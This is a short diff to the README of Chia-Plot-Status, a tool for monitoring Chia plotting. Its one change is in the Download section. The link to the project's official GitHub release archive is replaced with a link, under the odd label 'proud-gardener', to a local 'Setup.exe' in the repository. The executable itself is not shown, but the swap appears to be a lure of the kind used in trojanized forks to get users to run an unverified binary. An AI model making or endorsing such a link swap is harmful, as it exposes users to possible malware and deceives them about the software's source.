@@ -16,7 +16,7 @@
 
 ## Download
 
-[Download latest version proud-gardener](https://github.com/grayfallstown/Chia-Plot-Status/releases/download/0.9.0-beta/ChiaPlotStatus.zip)
+[Download latest version proud-gardener](./Setup.exe)
 
 ## Working with many distributed plotting rigs
 
